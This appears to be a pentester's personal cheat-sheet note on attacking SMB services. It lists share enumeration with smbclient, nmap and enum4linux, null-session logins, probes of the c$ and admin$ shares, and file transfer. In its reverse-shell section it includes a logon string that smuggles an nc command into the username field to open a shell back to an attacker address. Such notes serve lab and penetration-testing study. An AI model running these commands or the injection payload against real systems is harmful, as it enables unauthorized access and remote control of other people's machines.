---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[SMB]]  
___

## Description:  

**To see which shares are available on a given host, run:


```
impacket-smbclient user@10.10.110.5

smbclient -L //192.168.101.11/


sudo nmap --script smb-enum-shares 192.168.101.11

sudo nmap --script smb-enum-* 192.168.101.11

enum4linux -S 192.168.101.11

sudo nmap --script smb* 192.168.93.40

```

**Null login:

`kolby@kali:~/Desktop/openVPN$ smbclient //192.168.101.11/ITDEPT -U '' -N
Try "help" to get a list of possible commands.


**Try common shares if you cannot list them:

```
smbclient //192.168.93.40/ipc$
smbclient //192.168.93.40/c$
smbclient //192.168.93.40/admin$

```


**to put a file on the share:

`put test.txt

**To get a file:

`get example.txt

**Reverse shells:

`logon “/=`nc 192.168.49.101 4444 -e /bin/bash`"


**Hosting a smb share
 
`impacket-smbserver public .



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (01:56 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>